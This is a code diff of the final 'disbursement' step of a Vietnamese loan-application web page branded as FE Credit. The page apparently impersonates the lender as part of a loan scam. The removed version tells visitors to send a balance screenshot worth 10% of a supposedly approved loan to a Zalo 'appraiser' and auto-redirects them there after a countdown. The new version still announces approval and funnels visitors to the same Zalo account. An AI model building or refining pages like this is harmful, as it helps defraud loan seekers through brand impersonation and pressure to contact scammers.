@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover" />
-    <title>Phê Duyệt Khoản Vay - FE Credit</title>
+    <title>Hoàn Tất Đăng Ký - FE Credit</title>
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
       rel="stylesheet"
@@ -18,7 +18,7 @@
     />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
 
-    <!-- Mobile UI Enhancement - NEW -->
+    <!-- Mobile UI Enhancement -->
     <link rel="stylesheet" href="unified-design-system.css">
     <link rel="stylesheet" href="mobile-accessibility.css">
 
@@ -36,8 +36,6 @@
         --text-primary: #292929;
         --text-secondary: #666666;
         --border-color: #e9ecef;
-        --warning-bg: #fff7ed;
-        --warning-border: #f59e0b;
       }
 
       * {
@@ -52,9 +50,12 @@
         background-color: var(--secondary-color);
         color: var(--text-primary);
         line-height: 1.6;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
       }
 
-      /* FE Credit Header (giống step6, step7) */
+      /* FE Credit Header */
       .fecredit-header {
         background: #fff !important;
         border-bottom: 1px solid #ECECEC;
@@ -95,358 +96,271 @@
         color: var(--primary-light);
       }
 
-      .container-main {
-        max-width: 90%;
-        width: 100%;
-        margin: 0 auto;
-        padding: 25px;
-        background: white;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        position: relative;
-      }
-      @media (min-width: 768px) {
-        .container-main {
-          max-width: 700px;
-          margin: 20px auto;
-        }
-      }
-
-      .nav-tabs {
-        display: flex;
-        justify-content: space-around;
-        margin-bottom: 25px;
-        margin-top: 0;
-        flex-wrap: nowrap;
-        overflow-x: auto;
-        white-space: nowrap;
-        -webkit-overflow-scrolling: touch;
-      }
-      .nav-tabs .nav-item {
-        flex: 1;
-        text-align: center;
-      }
-      .nav-tabs .nav-link {
-        background-color: #d3d3d3;
-        color: #ffffff;
-        border-radius: 20px;
-        padding: 8px 16px;
-        font-weight: 500;
-        font-size: 14px;
-        width: 100%;
-        margin: 0 5px;
-        transition: background-color 0.3s;
-      }
-      .nav-tabs .nav-link.active {
-        background-color: var(--primary-color);
-        color: #ffffff;
-      }
-      .nav-tabs .nav-link:hover {
-        background-color: var(--primary-light);
-        color: var(--primary-dark);
-      }
-
-      @media (max-width: 767px) {
-        .nav-tabs .nav-link {
-          font-size: 10px;
-          padding: 6px 8px;
-        }
-        .container-main {
-          max-width: 100% !important;
-          width: 100% !important;
-          padding: 12px !important;
-          margin: 0 !important;
-          border-radius: 0;
-        }
-      }
-
-      .step-title {
-        color: var(--primary-color);
-        font-size: 20px;
-        font-weight: 700;
-        margin-bottom: 20px;
-        text-transform: uppercase;
-        text-align: center;
-      }
-
       .divider-blue {
         border-top: 1px solid #b3cde0;
         margin: 15px 0;
       }
 
-      /* Success Header */
-      .success-header {
-        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
-        color: white;
-        padding: 25px 20px;
-        border-radius: 12px;
-        text-align: center;
-        margin-bottom: 20px;
-      }
-
-      .success-icon {
-        width: 70px;
-        height: 70px;
-        background: rgba(255, 255, 255, 0.2);
-        border-radius: 50%;
-        display: inline-flex;
+      /* Main Content Area */
+      .main-content {
+        flex: 1;
+        display: flex;
         align-items: center;
         justify-content: center;
-        margin-bottom: 15px;
+        padding: 30px 15px;
+      }
+
+      /* Success Card - Bootstrap Card Styled */
+      .success-card {
+        max-width: 600px;
+        width: 100%;
+        background: var(--white);
+        border-radius: 20px;
+        box-shadow: 0 10px 40px rgba(0, 153, 79, 0.15);
+        overflow: hidden;
+        animation: fadeInUp 0.6s ease-out;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* Card Header with Gradient */
+      .success-card-header {
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+        padding: 40px 30px;
+        text-align: center;
+        position: relative;
+      }
+
+      .success-card-header::after {
+        content: '';
+        position: absolute;
+        bottom: -20px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 0;
+        height: 0;
+        border-left: 25px solid transparent;
+        border-right: 25px solid transparent;
+        border-top: 20px solid var(--primary-dark);
+      }
+
+      /* Success Icon */
+      .success-icon-wrapper {
+        width: 100px;
+        height: 100px;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
         animation: pulse 2s infinite;
+        border: 4px solid rgba(255, 255, 255, 0.3);
       }
 
       @keyframes pulse {
-        0%, 100% { transform: scale(1); }
-        50% { transform: scale(1.05); }
+        0%, 100% { 
+          transform: scale(1); 
+          box-shadow: 0 0 0 0 rgba(159, 232, 112, 0.4);
+        }
+        50% { 
+          transform: scale(1.05); 
+          box-shadow: 0 0 0 20px rgba(159, 232, 112, 0);
+        }
       }
 
-      .success-icon i {
-        font-size: 32px;
-        color: white;
+      .success-icon-wrapper i {
+        font-size: 48px;
+        color: var(--white);
       }
 
-      .success-header h1 {
-        font-size: 1.4rem;
-        margin-bottom: 10px;
-        font-weight: 700;
-      }
-
-      .loan-amount {
+      .success-card-header h1 {
+        color: var(--white);
         font-size: 1.5rem;
         font-weight: 700;
-        color: var(--accent-color);
+        margin: 0;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.1);
       }
 
-      /* Alert Box */
-      .alert-box {
-        background: linear-gradient(135deg, #fff7ed 0%, #fed7aa 100%);
-        border-left: 4px solid var(--warning-border);
-        padding: 15px;
-        border-radius: 10px;
-        margin-bottom: 20px;
+      /* Card Body */
+      .success-card-body {
+        padding: 50px 30px 30px;
+        text-align: center;
       }
 
-      .alert-box h3 {
-        color: #92400e;
-        font-size: 1rem;
-        margin-bottom: 10px;
-        display: flex;
-        align-items: center;
-        gap: 8px;
+      /* Main Message - Prominent styling */
+      .main-message {
+        background: linear-gradient(135deg, #e8f8ee 0%, #d4edda 100%);
+        border: 2px solid var(--primary-color);
+        border-radius: 16px;
+        padding: 25px;
+        margin-bottom: 30px;
+        position: relative;
       }
 
-      .alert-box p {
-        color: #78350f;
-        margin: 6px 0;
-        font-size: 14px;
+      .main-message::before {
+        content: '';
+        position: absolute;
+        top: -2px;
+        left: -2px;
+        right: -2px;
+        bottom: -2px;
+        background: linear-gradient(135deg, var(--primary-color), var(--primary-light));
+        border-radius: 18px;
+        z-index: -1;
+        opacity: 0.3;
       }
 
-      .alert-box strong {
-        color: #92400e;
-      }
-
-      /* Steps */
-      .steps-guide {
-        display: flex;
-        flex-direction: column;
-        gap: 12px;
-        margin: 20px 0;
-      }
-
-      .step-item {
-        display: flex;
-        gap: 15px;
-        align-items: flex-start;
-        padding: 15px;
-        background: #f9fafb;
-        border-radius: 10px;
-        border: 1px solid var(--border-color);
-      }
-
-      .step-num {
-        width: 36px;
-        height: 36px;
-        background: var(--primary-color);
-        color: white;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: 700;
-        font-size: 14px;
-        flex-shrink: 0;
-      }
-
-      .step-content h4 {
-        font-size: 15px;
+      .main-message p {
         color: var(--primary-dark);
-        margin-bottom: 4px;
+        font-size: 1.1rem;
         font-weight: 600;
-      }
-
-      .step-content p {
-        font-size: 13px;
-        color: var(--text-secondary);
+        line-height: 1.8;
         margin: 0;
       }
 
-      /* CTA Section */
-      .cta-section {
-        text-align: center;
-        margin: 25px 0;
+      .main-message .highlight {
+        color: var(--primary-color);
+        font-weight: 700;
+        font-size: 1.15rem;
       }
 
-      .btn-zalo {
+      /* Loan Info */
+      .loan-info {
+        background: #f8f9fa;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 25px;
+      }
+
+      .loan-info-label {
+        color: var(--text-secondary);
+        font-size: 0.9rem;
+        margin-bottom: 5px;
+      }
+
+      .loan-info-value {
+        color: var(--primary-color);
+        font-size: 1.8rem;
+        font-weight: 700;
+      }
+
+      /* Action Buttons */
+      .action-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        margin-top: 25px;
+      }
+
+      .btn-contact {
         display: inline-flex;
         align-items: center;
+        justify-content: center;
         gap: 12px;
         background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
         color: white;
-        padding: 14px 30px;
+        padding: 16px 32px;
         border-radius: 50px;
-        font-size: 16px;
+        font-size: 1.1rem;
         font-weight: 600;
         border: none;
         cursor: pointer;
         text-decoration: none;
         transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(0, 153, 79, 0.3);
+        box-shadow: 0 6px 20px rgba(0, 153, 79, 0.35);
         position: relative;
         overflow: hidden;
       }
 
-      .btn-zalo::before {
+      .btn-contact::before {
         content: '';
         position: absolute;
         top: 0;
         left: -100%;
         width: 100%;
         height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
         transition: left 0.5s;
       }
 
-      .btn-zalo:hover::before {
+      .btn-contact:hover::before {
         left: 100%;
       }
 
-      .btn-zalo:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(0, 153, 79, 0.4);
+      .btn-contact:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 8px 25px rgba(0, 153, 79, 0.45);
         color: white;
         text-decoration: none;
       }
 
-      .countdown-text {
-        margin-top: 15px;
-        color: var(--text-secondary);
-        font-size: 14px;
+      .btn-contact:active {
+        transform: translateY(-1px);
       }
 
-      .countdown-text strong {
-        color: var(--primary-color);
-        font-size: 16px;
-      }
-
-      /* Info Box */
-      .info-box {
-        background: #f0f9ff;
-        border-left: 4px solid #0ea5e9;
-        padding: 12px 15px;
-        border-radius: 8px;
-        margin-top: 15px;
-      }
-
-      .info-box p {
-        color: #075985;
-        margin: 0;
-        font-size: 13px;
-      }
-
-      /* FAQ */
-      .faq-section {
-        margin-top: 25px;
-      }
-
-      .faq-title {
-        display: flex;
+      .btn-home {
+        display: inline-flex;
         align-items: center;
+        justify-content: center;
         gap: 10px;
-        margin-bottom: 15px;
-        color: var(--primary-dark);
-        font-size: 16px;
-        font-weight: 600;
-      }
-
-      .faq-title i {
+        background: transparent;
         color: var(--primary-color);
-      }
-
-      .faq-item {
-        border: 1px solid var(--border-color);
-        border-radius: 10px;
-        margin-bottom: 10px;
-        overflow: hidden;
-      }
-
-      .faq-question {
-        width: 100%;
-        background: #f9fafb;
-        border: none;
-        padding: 12px 15px;
-        text-align: left;
+        padding: 14px 28px;
+        border-radius: 50px;
+        font-size: 1rem;
         font-weight: 600;
-        font-size: 14px;
+        border: 2px solid var(--primary-color);
         cursor: pointer;
+        text-decoration: none;
+        transition: all 0.3s ease;
+      }
+
+      .btn-home:hover {
+        background: var(--primary-color);
+        color: white;
+        text-decoration: none;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 15px rgba(0, 153, 79, 0.25);
+      }
+
+      /* Info Note */
+      .info-note {
+        margin-top: 25px;
+        padding: 15px;
+        background: #f0f9ff;
+        border-radius: 10px;
+        border-left: 4px solid #0ea5e9;
+      }
+
+      .info-note p {
+        color: #075985;
+        font-size: 0.9rem;
+        margin: 0;
         display: flex;
-        justify-content: space-between;
         align-items: center;
-        transition: background 0.2s;
-        color: var(--text-primary);
+        gap: 8px;
       }
 
-      .faq-question:hover {
-        background: #f3f4f6;
+      .info-note i {
+        color: #0ea5e9;
       }
 
-      .faq-question i {
-        transition: transform 0.3s;
-        color: var(--primary-color);
-      }
-
-      .faq-question[aria-expanded="true"] i {
-        transform: rotate(180deg);
-      }
-
-      .faq-answer {
-        display: none;
-        padding: 12px 15px;
-        background: white;
-        font-size: 13px;
-        color: var(--text-secondary);
-      }
-
-      .faq-answer.open {
-        display: block;
-      }
-
-      .faq-answer ul, .faq-answer ol {
-        margin-left: 20px;
-        margin-top: 8px;
-      }
-
-      .faq-answer li {
-        margin: 6px 0;
-      }
-
-      /* Footer (giống step6, step7) */
+      /* Footer */
       .footer {
         text-align: center;
         padding: 20px;
         background-color: var(--primary-color);
         color: white;
-        margin-top: 20px;
         font-size: 12px;
       }
       .footer-links a {
@@ -459,96 +373,64 @@
         color: var(--primary-light);
       }
 
-      /* Back button */
-      .back-link {
-        display: inline-flex;
-        align-items: center;
-        gap: 6px;
-        color: var(--text-secondary);
-        font-size: 14px;
-        text-decoration: none;
-        margin-bottom: 15px;
-        transition: color 0.3s;
-      }
-
-      .back-link:hover {
-        color: var(--primary-color);
-      }
-
       /* Mobile Responsive */
       @media (max-width: 767px) {
-        .success-header {
-          padding: 20px 15px;
-          border-radius: 0;
-          margin: -12px -12px 15px -12px;
+        .main-content {
+          padding: 20px 10px;
+          align-items: flex-start;
+          padding-top: 30px;
         }
 
-        .success-icon {
-          width: 55px;
-          height: 55px;
+        .success-card {
+          border-radius: 16px;
+          margin: 0 5px;
         }
 
-        .success-icon i {
-          font-size: 26px;
+        .success-card-header {
+          padding: 30px 20px;
         }
 
-        .success-header h1 {
-          font-size: 1.2rem;
+        .success-icon-wrapper {
+          width: 80px;
+          height: 80px;
         }
 
-        .loan-amount {
-          font-size: 1.3rem;
+        .success-icon-wrapper i {
+          font-size: 36px;
         }
 
-        .alert-box {
-          padding: 12px;
+        .success-card-header h1 {
+          font-size: 1.25rem;
         }
 
-        .alert-box h3 {
+        .success-card-body {
+          padding: 40px 20px 25px;
+        }
+
+        .main-message {
+          padding: 20px;
+        }
+
+        .main-message p {
+          font-size: 1rem;
+        }
+
+        .main-message .highlight {
+          font-size: 1.05rem;
+        }
+
+        .loan-info-value {
+          font-size: 1.5rem;
+        }
+
+        .btn-contact {
+          padding: 14px 24px;
+          font-size: 1rem;
+        }
+
+        .btn-home {
+          padding: 12px 20px;
           font-size: 0.95rem;
-        }
-
-        .alert-box p {
-          font-size: 13px;
-        }
-
-        .step-item {
-          padding: 12px;
-        }
-
-        .step-num {
-          width: 32px;
-          height: 32px;
-          font-size: 13px;
-        }
-
-        .step-content h4 {
-          font-size: 14px;
-        }
-
-        .step-content p {
-          font-size: 12px;
-        }
-
-        .btn-zalo {
-          width: 100%;
-          padding: 14px 20px;
-          font-size: 15px;
-          justify-content: center;
-        }
-
-        .countdown-text {
-          font-size: 13px;
-        }
-
-        .faq-question {
-          font-size: 13px;
-          padding: 10px 12px;
-        }
-
-        .faq-answer {
-          font-size: 12px;
-          padding: 10px 12px;
         }
 
         .footer {
@@ -563,27 +445,46 @@
       }
 
       @media (max-width: 480px) {
-        .success-header h1 {
+        .success-card-header h1 {
           font-size: 1.1rem;
         }
 
-        .loan-amount {
-          font-size: 1.2rem;
+        .success-icon-wrapper {
+          width: 70px;
+          height: 70px;
         }
 
-        .step-item {
-          gap: 10px;
+        .success-icon-wrapper i {
+          font-size: 32px;
         }
 
-        .btn-zalo {
-          font-size: 14px;
-          padding: 12px 18px;
+        .main-message p {
+          font-size: 0.95rem;
+          line-height: 1.7;
+        }
+
+        .loan-info-value {
+          font-size: 1.3rem;
+        }
+
+        .action-buttons {
+          gap: 12px;
+        }
+
+        .btn-contact {
+          padding: 12px 20px;
+          font-size: 0.95rem;
+        }
+
+        .btn-home {
+          padding: 10px 18px;
+          font-size: 0.9rem;
         }
       }
     </style>
   </head>
   <body>
-    <!-- FE Credit Header giống step6, step7 -->
+    <!-- FE Credit Header -->
     <header class="fecredit-header">
       <div class="container-header">
         <div style="flex: 0 0 auto;">
@@ -618,179 +519,83 @@
 
     <hr class="divider-blue" style="margin: 0" />
 
-    <div class="container-main">
-      <!-- Tabs giống step6, step7 -->
-      <ul class="nav nav-tabs">
-        <li class="nav-item">
-          <a class="nav-link" href="step1.html">1. Nhập thông tin</a>
-        </li>
-        <li class="nav-item">
-          <a class="nav-link" href="step4.html">2. Xác thực và xử lý</a>
-        </li>
-        <li class="nav-item">
-          <a class="nav-link active" href="step8.html">3. Hoàn thành</a>
-        </li>
-      </ul>
-
-      <section id="step8" class="step-transition">
-        <!-- Back link -->
-        <a href="step7.html" class="back-link">
-          <i class="bi bi-arrow-left"></i>
-          Quay lại điều kiện giải ngân
-        </a>
-
-        <!-- Success Header -->
-        <div class="success-header">
-          <div class="success-icon">
-            <i class="fas fa-check"></i>
+    <!-- Main Content - Centered Success Card -->
+    <main class="main-content">
+      <div class="success-card">
+        <!-- Card Header with Success Icon -->
+        <div class="success-card-header">
+          <div class="success-icon-wrapper">
+            <i class="bi bi-check-circle-fill"></i>
           </div>
-          <h1>🎉 Khoản vay đã được phê duyệt</h1>
-          <div class="loan-amount" id="loanAmount">50,000,000 VND</div>
+          <h1>Hồ Sơ Đã Đủ Điều Kiện Giải Ngân</h1>
         </div>
 
-        <!-- Alert Box -->
-        <div class="alert-box">
-          <h3>
-            <i class="fas fa-exclamation-triangle"></i>
-            Liên hệ ngay để nhận tiền giải ngân
-          </h3>
-          <p>
-            <strong>Khoản vay đã được phê duyệt!</strong> Vui lòng liên hệ bộ phận thẩm định qua Zalo 
-            và cung cấp ảnh chụp màn hình số dư <strong id="requiredAmount">5,000,000 đ</strong> (10% số tiền vay).
-          </p>
-          <p><i class="fas fa-clock"></i> Thời gian xử lý: <strong>1-2 giờ</strong> làm việc</p>
-          <p><i class="fas fa-shield-alt"></i> Hoàn toàn <strong>miễn phí</strong> - Không cần chuyển tiền</p>
-        </div>
-
-        <!-- Steps Guide -->
-        <div class="steps-guide">
-          <div class="step-item">
-            <div class="step-num">1</div>
-            <div class="step-content">
-              <h4>Chuẩn bị ảnh số dư</h4>
-              <p>Chụp màn hình số dư tài khoản (trong vòng 24h)</p>
-            </div>
+        <!-- Card Body -->
+        <div class="success-card-body">
+          <!-- Loan Amount Info -->
+          <div class="loan-info">
+            <div class="loan-info-label">Số tiền vay được phê duyệt</div>
+            <div class="loan-info-value" id="loanAmount">50,000,000 VND</div>
           </div>
 
-          <div class="step-item">
-            <div class="step-num">2</div>
-            <div class="step-content">
-              <h4>Liên hệ Zalo</h4>
-              <p>Nhấn nút bên dưới để mở Zalo</p>
-            </div>
-          </div>
-
-          <div class="step-item">
-            <div class="step-num">3</div>
-            <div class="step-content">
-              <h4>Gửi ảnh xác minh</h4>
-              <p>Gửi ảnh số dư cho chuyên viên thẩm định</p>
-            </div>
-          </div>
-        </div>
-
-        <!-- CTA Section -->
-        <div class="cta-section">
-          <a 
-            href="https://zalo.me/3932037504673339016" 
-            target="_blank"
-            rel="noopener noreferrer"
-            class="btn-zalo"
-            id="zaloBtn"
-          >
-            <i class="fab fa-telegram-plane"></i>
-            <span>Liên hệ thẩm định ngay</span>
-            <i class="fas fa-arrow-right"></i>
-          </a>
-          
-          <div class="countdown-text">
-            <i class="fas fa-clock"></i>
-            Tự động chuyển hướng sau <strong id="countdown">40</strong> giây
-          </div>
-
-          <div class="info-box">
+          <!-- Main Important Message - Prominent styling -->
+          <div class="main-message">
             <p>
-              <i class="fas fa-info-circle"></i>
-              <strong>Lưu ý:</strong> Hãy chuẩn bị ảnh số dư trước khi liên hệ
+              <span class="highlight">Hồ sơ của bạn đã đủ điều kiện giải ngân.</span><br>
+              Vui lòng liên hệ nhân viên đã làm hồ sơ để được thẩm định và nhận tiền.
+            </p>
+          </div>
+
+          <!-- Action Buttons -->
+          <div class="action-buttons">
+            <a 
+              href="https://zalo.me/3932037504673339016" 
+              target="_blank"
+              rel="noopener noreferrer"
+              class="btn-contact"
+              id="zaloBtn"
+            >
+              <i class="bi bi-telephone-fill"></i>
+              <span>Liên hệ ngay</span>
+              <i class="bi bi-arrow-right"></i>
+            </a>
+            
+            <a href="../index.html" class="btn-home">
+              <i class="bi bi-house-door-fill"></i>
+              <span>Về trang chủ</span>
+            </a>
+          </div>
+
+          <!-- Info Note -->
+          <div class="info-note">
+            <p>
+              <i class="bi bi-info-circle-fill"></i>
+              <span>Thời gian xử lý: <strong>1-2 giờ</strong> làm việc sau khi liên hệ</span>
             </p>
           </div>
         </div>
+      </div>
+    </main>
 
-        <hr class="divider-blue" />
-
-        <!-- FAQ Section -->
-        <div class="faq-section">
-          <div class="faq-title">
-            <i class="fas fa-question-circle"></i>
-            <span>Câu hỏi thường gặp</span>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question" aria-expanded="false">
-              <span>Làm thế nào để liên hệ thẩm định?</span>
-              <i class="fas fa-chevron-down"></i>
-            </button>
-            <div class="faq-answer">
-              <ol>
-                <li>Nhấn nút "Liên hệ thẩm định ngay"</li>
-                <li>Gửi tin nhắn: "Tôi cần thẩm định giải ngân"</li>
-                <li>Gửi ảnh số dư tài khoản</li>
-                <li>Chờ xác minh và nhận kết quả</li>
-              </ol>
-            </div>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question" aria-expanded="false">
-              <span>Bao lâu thì giải ngân?</span>
-              <i class="fas fa-chevron-down"></i>
-            </button>
-            <div class="faq-answer">
-              <p><strong>1-2 giờ</strong> sau khi xác minh thành công (trong giờ làm việc)</p>
-              <ul>
-                <li>Ngoài giờ: Ngày làm việc tiếp theo</li>
-                <li>Cuối tuần: Thứ 2 tuần sau</li>
-              </ul>
-            </div>
-          </div>
-
-          <div class="faq-item">
-            <button class="faq-question" aria-expanded="false">
-              <span>Có mất phí không?</span>
-              <i class="fas fa-chevron-down"></i>
-            </button>
-            <div class="faq-answer">
-              <p><strong>Hoàn toàn miễn phí.</strong> Không thu phí thẩm định hoặc giải ngân.</p>
-              <p style="color: #dc2626;"><strong>Cảnh báo:</strong> Nếu có người yêu cầu chuyển tiền, đó là lừa đảo!</p>
-            </div>
-          </div>
-        </div>
-      </section>
-    </div>
-
-    <div class="footer" id="footer">
+    <!-- Footer -->
+    <footer class="footer" id="footer">
       <div class="footer-links">
         <a href="chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
         <a href="dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
         <a href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan">Liên hệ</a>
       </div>
       <p class="mt-3">© 2025 FE CREDIT BANK VIETNAM ALL RIGHTS RESERVED.</p>
-    </div>
+    </footer>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
       // =====================================================================
-      // STEP 8: PHÊ DUYỆT KHOẢN VAY - BUSINESS LOGIC
-      // Giữ nguyên logic từ file cũ, chỉ cải thiện cách thức
+      // STEP 8: HOÀN TẤT ĐĂNG KÝ - BUSINESS LOGIC
       // =====================================================================
       
       const ENCRYPTION_KEY = "fecredit-secret-key";
-      
-      // =====================================================================
-      // UTILITY FUNCTIONS
-      // =====================================================================
       
       /**
        * Format currency
@@ -819,17 +624,12 @@
             data = JSON.parse(raw);
           }
           
-          // Update UI
+          // Update UI with loan amount
           const loan = parseFloat(data.loanAmount);
           if (!isNaN(loan)) {
             const loanAmountEl = document.getElementById('loanAmount');
-            const requiredAmountEl = document.getElementById('requiredAmount');
-            
             if (loanAmountEl) {
               loanAmountEl.textContent = formatCurrency(loan);
-            }
-            if (requiredAmountEl) {
-              requiredAmountEl.textContent = formatCurrency(loan * 0.1, 'đ');
             }
           }
         } catch (err) {
@@ -837,74 +637,9 @@
         }
       }
       
-      // =====================================================================
-      // FAQ TOGGLE
-      // =====================================================================
-      
-      function initFAQ() {
-        const faqQuestions = document.querySelectorAll('.faq-question');
-        faqQuestions.forEach(btn => {
-          btn.onclick = () => {
-            const isOpen = btn.getAttribute('aria-expanded') === 'true';
-            btn.setAttribute('aria-expanded', !isOpen);
-            const answer = btn.nextElementSibling;
-            if (answer) {
-              answer.classList.toggle('open', !isOpen);
-            }
-          };
-        });
-      }
-      
-      // =====================================================================
-      // COUNTDOWN & AUTO-REDIRECT
-      // =====================================================================
-      
-      let countdownTimer = null;
-      
-      function initCountdown() {
-        const countdownEl = document.getElementById('countdown');
-        const zaloBtn = document.getElementById('zaloBtn');
-        const zaloUrl = 'https://zalo.me/3932037504673339016';
-        
-        if (!countdownEl) return;
-        
-        let sec = 40;
-        countdownTimer = setInterval(() => {
-          countdownEl.textContent = sec;
-          if (sec-- <= 0) {
-            clearInterval(countdownTimer);
-            countdownTimer = null;
-            window.location.href = zaloUrl;
-          }
-        }, 1000);
-        
-        // Stop countdown when user clicks Zalo button
-        if (zaloBtn) {
-          zaloBtn.onclick = () => {
-            if (countdownTimer) {
-              clearInterval(countdownTimer);
-              countdownTimer = null;
-            }
-          };
-        }
-      }
-      
-      // =====================================================================
-      // INITIALIZATION
-      // =====================================================================
-      
+      // Initialize on page load
       document.addEventListener('DOMContentLoaded', () => {
         loadData();
-        initFAQ();
-        initCountdown();
-      });
-      
-      // Cleanup on page unload
-      window.addEventListener('beforeunload', () => {
-        if (countdownTimer) {
-          clearInterval(countdownTimer);
-          countdownTimer = null;
-        }
       });
     </script>
 
